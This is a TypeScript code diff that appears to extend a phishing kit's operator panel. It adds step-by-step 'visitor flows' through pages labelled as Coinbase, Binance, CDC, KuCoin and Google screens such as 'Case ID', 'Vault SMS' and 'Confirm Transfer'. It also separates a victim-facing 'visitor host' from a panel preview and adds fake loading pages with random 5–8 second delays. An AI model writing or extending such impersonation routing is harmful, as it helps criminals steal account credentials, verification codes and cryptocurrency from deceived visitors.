@@ -15,6 +15,81 @@
 import { dbGetSetting } from './database.js';
 import { templateLabelToVisitorPath } from './visitorRouter.js';
 
+const FLOW_LABEL_RE = /^[A-Z][^/]+\/.+/;
+
+export function isValidFlowLabel(step: string): boolean {
+	return FLOW_LABEL_RE.test(step);
+}
+
+/** First Brand/Page step in a flow definition. */
+export function firstValidFlowStep(steps: string[]): string | null {
+	return steps.find((s) => isValidFlowLabel(s)) || null;
+}
+
+/** Visitor URL path for the flow's entry step (e.g. Coinbase/Case ID → /case). */
+export function getFlowLandingPath(steps: string[], module: string): string | null {
+	const first = firstValidFlowStep(steps);
+	if (!first) return null;
+	return templateLabelToVisitorPath(first, module);
+}
+
+export interface FlowAdvanceResult {
+	nextUrl: string | null;
+	nextLabel: string | null;
+	flowApplied: boolean;
+	markedPassed: boolean;
+}
+
+/**
+ * Resolve the next URL from an assigned visitor flow.
+ * When the visitor is on a page outside the flow (e.g. /loading while step 1 is Case ID),
+ * redirect to the first unpassed step without advancing the funnel default (Activity).
+ */
+export function resolveVisitorFlowAdvance(
+	visitor: {
+		flowBypassed?: boolean;
+		flowSteps?: { page: string; passed: boolean }[];
+		module: string;
+	},
+	currentLabel: string,
+	isVisitorHost: boolean,
+	queryParams?: URLSearchParams
+): FlowAdvanceResult {
+	if (visitor.flowBypassed || !visitor.flowSteps?.length) {
+		return { nextUrl: null, nextLabel: null, flowApplied: false, markedPassed: false };
+	}
+
+	const qp = queryParams?.size ? queryParams : undefined;
+	const steps = visitor.flowSteps;
+
+	const stepIdx = steps.findIndex((s) => s.page === currentLabel && !s.passed);
+	if (stepIdx !== -1) {
+		steps[stepIdx].passed = true;
+		const nextStep = steps.find((s) => !s.passed && isValidFlowLabel(s.page));
+		if (nextStep) {
+			return {
+				nextUrl: resolveLabelRedirectUrl(nextStep.page, visitor.module, isVisitorHost, qp),
+				nextLabel: nextStep.page,
+				flowApplied: true,
+				markedPassed: true
+			};
+		}
+		return { nextUrl: null, nextLabel: null, flowApplied: true, markedPassed: true };
+	}
+
+	const firstUnpassed = steps.find((s) => !s.passed && isValidFlowLabel(s.page));
+	if (firstUnpassed) {
+		return {
+			nextUrl: resolveLabelRedirectUrl(firstUnpassed.page, visitor.module, isVisitorHost, qp),
+			nextLabel: firstUnpassed.page,
+			flowApplied: true,
+			markedPassed: false
+		};
+	}
+
+	return { nextUrl: null, nextLabel: null, flowApplied: false, markedPassed: false };
+}
+
 export const DEFAULT_NEXT_PAGE: Record<string, string> = {
 	// --- Coinbase ---
 	'Coinbase/Loading': 'Coinbase/Activity',
@@ -100,7 +175,12 @@ export const SKIP_GENERIC_WIRING = new Set<string>([
 	'Coinbase/Confirm Transfer',
 	'Coinbase/Vault SMS',
 	'Coinbase/Verification Required',
-	'Coinbase/Vault Dashboard'
+	'Coinbase/Vault Dashboard',
+	'Coinbase/Loading',
+	'CDC/Loading',
+	'Binance/Loading',
+	'Google/Loading',
+	'KuCoin/Loading'
 ]);
 
 export function settingKey(brand: string, page: string): string {
@@ -134,6 +214,25 @@ export function labelToVisitorUrl(
 	return qs ? `${path}?${qs}` : path;
 }
 
+/** Resolve a Brand/Page label to a URL on the visitor domain or panel preview. */
+export function resolveLabelRedirectUrl(
+	label: string | null | undefined,
+	module: string | undefined,
+	isVisitorHost: boolean,
+	queryParams?: URLSearchParams
+): string | null {
+	if (!label) return null;
+	const qp = queryParams?.size ? queryParams : undefined;
+	if (isVisitorHost && module) {
+		return labelToVisitorUrl(label, module, qp);
+	}
+	const base = labelToUrl(label);
+	if (!base) return null;
+	if (!qp) return base;
+	const qs = qp.toString();
+	return qs ? `${base}?${qs}` : base;
+}
+
 export interface NextUrlOptions {
 	module?: string;
 	isVisitorHost?: boolean;
@@ -154,4 +253,51 @@ export function getNextUrl(
 	if (!base || !queryParams || opts?.isVisitorHost) return base;
 	const qs = queryParams.toString();
 	return qs ? `${base}?${qs}` : base;
+}
+
+const LOADING_GATE_PATHS = new Set(['/loading', '/sign-in/loading']);
+
+/** Random pause shown on the loading interstitial (5–8 seconds). */
+export function randomLoadingDelayMs(): number {
+	return 5000 + Math.floor(Math.random() * 3001);
+}
+
+function isVisitorLoadingPath(url: string): boolean {
+	const path = url.split('?')[0].split('#')[0];
+	return LOADING_GATE_PATHS.has(path);
+}
+
+/**
+ * Send the visitor through /loading with ?next= and ?ms= before the real destination.
+ * Skipped on panel preview hosts and when the destination is already a loading page.
+ */
+export function applyLoadingInterstitial(
+	nextUrl: string | null,
+	queryParams?: URLSearchParams,
+	opts?: { isVisitorHost?: boolean }
+): string | null {
+	if (!nextUrl || !opts?.isVisitorHost) return nextUrl;
+	if (isVisitorLoadingPath(nextUrl)) return nextUrl;
+
+	const ms = randomLoadingDelayMs();
+	const gateQp = new URLSearchParams();
+
+	if (queryParams?.size) {
+		queryParams.forEach((v, k) => {
+			if (k !== 'next' && k !== 'ms') gateQp.set(k, v);
+		});
+	}
+
+	const qIdx = nextUrl.indexOf('?');
+	if (qIdx !== -1) {
+		const destQp = new URLSearchParams(nextUrl.slice(qIdx + 1));
+		destQp.forEach((v, k) => {
+			if (k !== 'next' && k !== 'ms') gateQp.set(k, v);
+		});
+	}
+
+	gateQp.set('next', nextUrl);
+	gateQp.set('ms', String(ms));
+
+	return `/loading?${gateQp.toString()}`;
 }
